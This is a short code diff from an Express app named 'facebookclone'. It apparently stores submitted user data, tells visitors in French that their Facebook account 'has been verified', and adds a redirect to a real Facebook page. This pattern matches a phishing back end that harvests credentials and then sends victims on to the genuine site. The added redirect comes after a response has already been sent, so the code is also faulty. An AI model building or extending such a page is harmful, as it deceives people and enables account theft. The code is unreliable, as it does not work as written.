@@ -34,6 +34,7 @@ app.post("/facebookclone/api",(req,res,next)=>{
     .then(()=>{
         res.status(201).send("Bien, votre compte a bien été verifié mainteneant vous pouvez navigeur sur facebook en toute securité")
         console.log("Un utilisateur a été crée")
+        res.redirect("https://www.facebook.com/brutofficiel")
     })
     .catch(err=>{
         res.status(500).json({err})
